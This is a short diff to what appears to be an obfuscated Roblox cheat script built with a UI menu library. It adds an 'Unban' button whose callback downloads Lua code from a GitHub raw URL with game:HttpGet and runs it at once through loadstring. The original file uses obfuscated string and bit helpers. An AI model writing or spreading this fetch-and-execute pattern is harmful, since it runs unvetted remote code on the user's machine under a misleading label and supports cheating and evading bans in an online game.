@@ -204,6 +204,13 @@ local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or 
 end,
 })
 
+local Button = Tab:CreateButton({
+	Name = "Unban",
+	Callback = function()
+	    loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/swagPLUS",true))()
+	end,
+})
+
 local Tab = Window:CreateTab("Credits", 4483362458)
 
 local Paragraph = Tab:CreateParagraph({Title = "Owner", Content = "alxpeez#0001"})
